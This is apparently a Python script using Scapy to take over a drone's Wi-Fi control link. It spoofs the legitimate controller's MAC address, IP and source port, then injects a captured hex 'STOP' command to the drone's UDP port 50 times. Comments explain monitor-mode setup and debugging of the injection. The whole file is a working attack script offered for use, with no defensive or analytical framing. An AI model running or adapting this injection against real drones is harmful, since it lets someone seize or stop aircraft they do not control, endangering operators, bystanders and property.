import binascii
import time
from scapy.all import sendp, Dot11, RadioTap, IP, UDP, conf

# IMPORTANT: Run this script with sudo/root privileges on a Linux system
# with the Wi-Fi card in monitor mode (e.g., using 'airmon-ng start wlan0')

# --- CONFIGURATION ---

# Interface name *in monitor mode* (e.g., wlan0mon, mon0)
MONITOR_INTERFACE = "wlan0mon" 

# MAC Addresses
CONTROLLER_MAC = "CA:A9:96:5B:50:05" # <--- LEGIT CONTROLLER MAC (addr2)
DRONE_MAC      = "C4:D7:FD:0E:F3:6D" # <--- DRONE'S MAC (addr1 & addr3)

# IP/Port Configuration
CONTROLLER_IP = "192.168.169.2"
DRONE_IP      = "192.168.169.1"
DRONE_PORT    = 8800
LEGIT_SOURCE_PORT = 40617 # <-- CONTROLLER PORT (CHANGES)

# STATIC STOP COMMAND PAYLOAD (CURRENTLY THE SHORTER VERSION)
# If this does not work, the length must be the issue (see section 2)
STOP_HEX = (
    "ef0258000202000100000000d7000000140066148080808002020000000000000000000000990000000000000000000000000000000000000000000000000000000000000000000000000000000000000000324b142d0000"
)
STOP_RAW_BYTES = binascii.unhexlify(STOP_HEX)
# -------------------------------------------

def inject_stop_command(interface):
    print(f"Targeting: {DRONE_MAC} ({DRONE_IP}:{DRONE_PORT})")
    print(f"Injecting as: {CONTROLLER_MAC} ({CONTROLLER_IP}:{LEGIT_SOURCE_PORT})")
    print("-" * 50)
    
    # 1. Build the UDP/IP Payload (Layer 4/3)
    udp_packet = IP(src=CONTROLLER_IP, dst=DRONE_IP) / \
                 UDP(sport=LEGIT_SOURCE_PORT, dport=DRONE_PORT) / \
                 STOP_RAW_BYTES

    # 2. Build the 802.11 Frame (Layer 2)
    # FIX: Removed the seqnum=1000 argument to prevent the crash
    dot11_frame = Dot11(
        addr1=DRONE_MAC, 
        addr2=CONTROLLER_MAC, 
        addr3=DRONE_MAC,
        type=2, 
        subtype=8 # QoS Data
        # Note: Scapy will now automatically handle the sequence number.
    )

    # 3. Assemble the full Injection Packet
    injection_packet = RadioTap() / dot11_frame / udp_packet

    # 4. Injection Loop
    try:
        count = 0
        while count < 50: 
            sendp(injection_packet, iface=interface, verbose=False)
            
            if count % 10 == 0:
                print(f"Injected STOP command packet {count + 1}/50.")
            count += 1
            time.sleep(0.01)
            
        print(f"Injected 50 STOP packets successfully.")
            
    except Exception as e:
        print(f"\nFATAL INJECTION ERROR. Check Scapy install, monitor mode, and sudo privileges.")
        print(f"Details: {type(e).__name__}: {e}")

if __name__ == "__main__":
    inject_stop_command(MONITOR_INTERFACE)
